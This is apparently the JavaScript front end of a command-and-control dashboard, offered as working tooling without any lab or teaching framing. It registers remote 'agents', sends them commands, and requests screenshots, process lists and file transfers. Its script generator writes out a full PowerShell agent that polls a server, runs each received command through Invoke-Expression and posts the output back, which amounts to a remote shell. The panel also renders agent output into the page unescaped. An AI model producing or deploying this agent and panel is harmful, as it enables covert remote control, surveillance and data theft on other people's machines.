// Global variables
let currentAgentId = '';
let toast;
let isAuthenticated = false;

// Initialize application
document.addEventListener('DOMContentLoaded', function() {
    toast = new bootstrap.Toast(document.getElementById('toast'));
    checkAuthentication();
});

// Authentication functions
async function checkAuthentication() {
    try {
        const response = await fetch('/auth-check');
        if (response.ok) {
            isAuthenticated = true;
            showDashboard();
            initializeDashboard();
        } else {
            showLogin();
        }
    } catch (error) {
        showLogin();
    }
}

function showLogin() {
    document.getElementById('loginScreen').style.display = 'flex';
    document.getElementById('dashboard').style.display = 'none';
}

function showDashboard() {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
}

function initializeDashboard() {
    loadAgents();
    loadResults();
    loadCommandHistory();
    
    // Auto-refresh every 5 seconds
    setInterval(() => {
        loadAgents();
        loadResults();
        loadCommandHistory();
    }, 5000);
}

// Login form handler
document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    
    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username, password})
        });
        
        if (response.ok) {
            isAuthenticated = true;
            document.getElementById('currentUser').textContent = username;
            showDashboard();
            initializeDashboard();
            showToast('Login successful!', 'success');
        } else {
            showToast('Invalid credentials!', 'error');
        }
    } catch (error) {
        showToast('Login failed: ' + error.message, 'error');
    }
});

// Logout function
async function logout() {
    try {
        await fetch('/logout');
        isAuthenticated = false;
        showLogin();
        showToast('Logged out successfully!', 'info');
    } catch (error) {
        showToast('Logout failed: ' + error.message, 'error');
    }
}

// Show toast notification
function showToast(message, type = 'info') {
    const toastBody = document.getElementById('toastBody');
    toastBody.textContent = message;
    
    const toastElement = document.getElementById('toast');
    toastElement.className = `toast ${type === 'error' ? 'bg-danger text-white' : type === 'success' ? 'bg-success text-white' : 'bg-info text-white'}`;
    
    toast.show();
}

// Register Agent from Dashboard
document.getElementById("registerForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const id = document.getElementById("regAgentId").value;
    
    try {
        const res = await fetch(`/register?id=${id}`);
        if (res.ok) {
            const text = await res.text();
            showToast(`Agent ${id} registered successfully!`, 'success');
            document.getElementById("regAgentId").value = "";
            loadAgents();
        } else {
            showToast(`Failed to register agent: ${res.statusText}`, 'error');
        }
    } catch (error) {
        showToast(`Error registering agent: ${error.message}`, 'error');
    }
});

// Generate PowerShell Agent Script
document.getElementById("genForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const id = document.getElementById("genAgentId").value;
    
    const script = `$agentID = "${id}"
$server = "http://localhost:8080"
$interval = 15  # seconds

# Register Agent First (always)
try {
    Invoke-RestMethod -Uri "$server/register?id=$agentID" -Method GET
    Write-Host "[*] Agent registered with server"
} catch {
    Write-Host "[!] Registration failed: $_"
    exit
}

function Get-Command {
    $url = "$server/get-task?id=$agentID"
    try {
        $response = Invoke-RestMethod -Uri $url -Method GET
        Write-Host "[*] Polled command: $($response.command)"
        return $response.command
    } catch {
        Write-Host "[!] Failed to poll command: $_"
        return ""
    }
}

function Send-Result($output) {
    $body = @{
        agent_id = $agentID
        output   = $output
        time     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri "$server/submit-result" -Method POST -Body $body -ContentType "application/json"
        Write-Host ("[*] Sent result for {0}: {1}" -f $agentID, $output)
    } catch {
        Write-Host "[!] Failed to send result: $_"
    }
}

while ($true) {
    $cmd = Get-Command
    if ($cmd -ne "") {
        try {
            $result = Invoke-Expression $cmd | Out-String
        } catch {
            $result = "Error: $_"
        }
        Send-Result $result
    }
    Start-Sleep -Seconds $interval
}`;

    document.getElementById("scriptOutput").value = script;
    showToast(`PowerShell script generated for agent ${id}`, 'success');
});

// Load and display agents
async function loadAgents() {
    try {
        const res = await fetch("/api/agents");
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        
        const agents = await res.json();
        const agentList = document.getElementById("agentList");
        
        if (agents.length === 0) {
            agentList.innerHTML = '<div class="text-center text-muted"><i class="fas fa-users-slash"></i> No agents registered</div>';
            return;
        }
        
        agentList.innerHTML = '';
        agents.forEach(agent => {
            const agentItem = document.createElement('div');
            agentItem.className = 'agent-item';
            agentItem.innerHTML = `
                <div>
                    <span class="status-indicator online"></span>
                    <span class="agent-id">${agent}</span>
                </div>
                <div>
                    <span class="agent-status online">Online</span>
                    <button class="btn btn-sm btn-outline-primary ms-2" onclick="selectAgent('${agent}')">
                        <i class="fas fa-terminal"></i> Select
                    </button>
                </div>
            `;
            agentList.appendChild(agentItem);
        });
    } catch (error) {
        console.error('Error loading agents:', error);
        document.getElementById("agentList").innerHTML = 
            '<div class="text-center text-danger"><i class="fas fa-exclamation-triangle"></i> Error loading agents</div>';
    }
}

// Load and display results
async function loadResults() {
    try {
        const res = await fetch("/api/results");
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        
        const results = await res.json();
        const resultsContainer = document.getElementById("results");
        
        if (Object.keys(results).length === 0) {
            resultsContainer.innerHTML = '<div class="text-center text-muted"><i class="fas fa-inbox"></i> No results available</div>';
            return;
        }
        
        resultsContainer.innerHTML = '';
        for (const [agentId, output] of Object.entries(results)) {
            const resultItem = document.createElement('div');
            resultItem.className = 'result-item';
            resultItem.innerHTML = `
                <div class="result-agent">
                    <i class="fas fa-user"></i> ${agentId}
                    <small class="text-muted ms-2">${new Date().toLocaleTimeString()}</small>
                </div>
                <div class="result-output">${output}</div>
            `;
            resultsContainer.appendChild(resultItem);
        }
    } catch (error) {
        console.error('Error loading results:', error);
        document.getElementById("results").innerHTML = 
            '<div class="text-center text-danger"><i class="fas fa-exclamation-triangle"></i> Error loading results</div>';
    }
}

// Load and display command history
async function loadCommandHistory() {
    try {
        const res = await fetch("/api/history");
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        
        const history = await res.json();
        const historyContainer = document.getElementById("commandHistory");
        
        if (history.length === 0) {
            historyContainer.innerHTML = '<div class="text-center text-muted"><i class="fas fa-history"></i> No command history</div>';
            return;
        }
        
        historyContainer.innerHTML = '';
        history.slice(-10).reverse().forEach(item => {
            const historyItem = document.createElement('div');
            historyItem.className = 'history-item';
            historyItem.innerHTML = `
                <div class="history-header">
                    <span class="history-agent">
                        <i class="fas fa-user"></i> ${item.agent_id}
                    </span>
                    <div>
                        <span class="history-status ${item.status}">${item.status}</span>
                        <span class="history-time">${item.timestamp}</span>
                    </div>
                </div>
                <div class="history-command">${item.command}</div>
                ${item.output ? `<div class="history-output">${item.output}</div>` : ''}
            `;
            historyContainer.appendChild(historyItem);
        });
    } catch (error) {
        console.error('Error loading history:', error);
        document.getElementById("commandHistory").innerHTML = 
            '<div class="text-center text-danger"><i class="fas fa-exclamation-triangle"></i> Error loading history</div>';
    }
}

// Send command to agent
document.getElementById("taskForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const id = document.getElementById("agentId").value;
    const cmd = document.getElementById("cmd").value;
    
    if (!id || !cmd) {
        showToast('Please fill in both Agent ID and Command fields', 'error');
        return;
    }
    
    try {
        const response = await fetch("/api/send", {
            method: "POST",
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({agent_id: id, command: cmd})
        });
        
        if (response.ok) {
            showToast(`Command sent to agent ${id}`, 'success');
            document.getElementById("cmd").value = "";
            loadCommandHistory();
        } else {
            showToast(`Failed to send command: ${response.statusText}`, 'error');
        }
    } catch (error) {
        showToast(`Error sending command: ${error.message}`, 'error');
    }
});

// Select agent for quick commands
function selectAgent(agentId) {
    currentAgentId = agentId;
    document.getElementById("agentId").value = agentId;
    showToast(`Selected agent: ${agentId}`, 'info');
}

// Quick command function
function quickCommand(command) {
    if (!currentAgentId) {
        showToast('Please select an agent first or enter an Agent ID', 'error');
        return;
    }
    
    document.getElementById("cmd").value = command;
    document.getElementById("taskForm").dispatchEvent(new Event('submit'));
}

// File upload function
async function uploadFile() {
    const fileInput = document.getElementById('fileUpload');
    const file = fileInput.files[0];
    
    if (!file) {
        showToast('Please select a file to upload', 'error');
        return;
    }
    
    if (!currentAgentId) {
        showToast('Please select an agent first', 'error');
        return;
    }
    
    const formData = new FormData();
    formData.append('file', file);
    formData.append('agent_id', currentAgentId);
    
    try {
        const response = await fetch('/api/upload', {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            const result = await response.json();
            showToast(`File uploaded: ${result.filename}`, 'success');
            fileInput.value = '';
        } else {
            showToast('File upload failed', 'error');
        }
    } catch (error) {
        showToast('Upload error: ' + error.message, 'error');
    }
}

// File download function
async function downloadFile() {
    const filePath = document.getElementById('filePath').value;
    
    if (!filePath) {
        showToast('Please enter a file path', 'error');
        return;
    }
    
    if (!currentAgentId) {
        showToast('Please select an agent first', 'error');
        return;
    }
    
    try {
        const response = await fetch(`/api/download?agent_id=${currentAgentId}&path=${encodeURIComponent(filePath)}`);
        
        if (response.ok) {
            const result = await response.json();
            showToast(`Download requested: ${result.path}`, 'success');
            document.getElementById('filePath').value = '';
        } else {
            showToast('Download request failed', 'error');
        }
    } catch (error) {
        showToast('Download error: ' + error.message, 'error');
    }
}

// Screenshot function
async function takeScreenshot() {
    if (!currentAgentId) {
        showToast('Please select an agent first', 'error');
        return;
    }
    
    try {
        const response = await fetch(`/api/screenshot?agent_id=${currentAgentId}`);
        
        if (response.ok) {
            const result = await response.json();
            showToast(`Screenshot requested for agent ${result.agent_id}`, 'success');
        } else {
            showToast('Screenshot request failed', 'error');
        }
    } catch (error) {
        showToast('Screenshot error: ' + error.message, 'error');
    }
}

// Process list function
async function getProcesses() {
    if (!currentAgentId) {
        showToast('Please select an agent first', 'error');
        return;
    }
    
    try {
        const response = await fetch(`/api/processes?agent_id=${currentAgentId}`);
        
        if (response.ok) {
            const result = await response.json();
            showToast(`Process list requested for agent ${result.agent_id}`, 'success');
        } else {
            showToast('Process list request failed', 'error');
        }
    } catch (error) {
        showToast('Process list error: ' + error.message, 'error');
    }
}

// Copy script to clipboard
function copyScript() {
    const scriptOutput = document.getElementById("scriptOutput");
    scriptOutput.select();
    document.execCommand('copy');
    showToast('Script copied to clipboard!', 'success');
}

// Add copy button functionality
document.addEventListener('DOMContentLoaded', function() {
    const scriptOutput = document.getElementById("scriptOutput");
    if (scriptOutput) {
        const copyButton = document.createElement('button');
        copyButton.className = 'btn btn-sm btn-outline-secondary mt-2';
        copyButton.innerHTML = '<i class="fas fa-copy"></i> Copy Script';
        copyButton.onclick = copyScript;
        scriptOutput.parentNode.appendChild(copyButton);
    }
});
